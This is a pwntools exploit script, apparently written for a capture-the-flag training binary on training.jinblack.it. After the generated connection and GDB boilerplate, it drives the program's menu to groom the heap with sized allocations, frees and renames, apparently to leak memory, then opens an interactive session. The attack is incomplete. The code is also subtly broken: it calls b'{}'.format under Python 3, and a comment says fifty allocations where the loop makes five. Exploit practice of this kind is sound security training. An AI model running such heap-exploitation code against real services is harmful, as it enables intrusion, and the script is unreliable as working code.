#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host training.jinblack.it --port 65535 pkm_nopie_notimer
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pkm_nopie_notimer')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'training.jinblack.it'
port = int(args.PORT or 65535)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *0x0040166d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

io = start()

def add():
	io.recvuntil('> ')
	io.sendline(b'0')

def rename(n, name):
	io.recvuntil('> ')
	io.sendline(b'1')
	io.recvuntil('> ')
	io.sendline(b'{}'.format(n))
	io.recvuntil('[.] insert length: ')
	io.sendline(b'{}'.format(len(name)))
	io.sendline(b'{}'.format(name))

def delete(n):
	io.recvuntil('> ')
	io.sendline(b'2')
	io.recvuntil('> ')
	io.sendline(b'{}'.format(n))

def info(n):
	io.recvuntil('> ')
	io.sendline(b'4')
	io.sendline(b'{}'.format(n))
	io.recvuntil('Name:')
	name = io.recvuntil('\n')
	return name

# alloc 50 pkms
for i in range(5):
	add()

rename(0, 'A' * 0xf8)
rename(1, 'B' * 0x68)
rename(2, 'C' * 0xf8)
rename(3, 'D' * 0x10)

delete(0)

delete(1)
rename(4, 'B' * 0x100)



rename(1, 'shrek')
delete(0)
print(info(1))

io.interactive()


















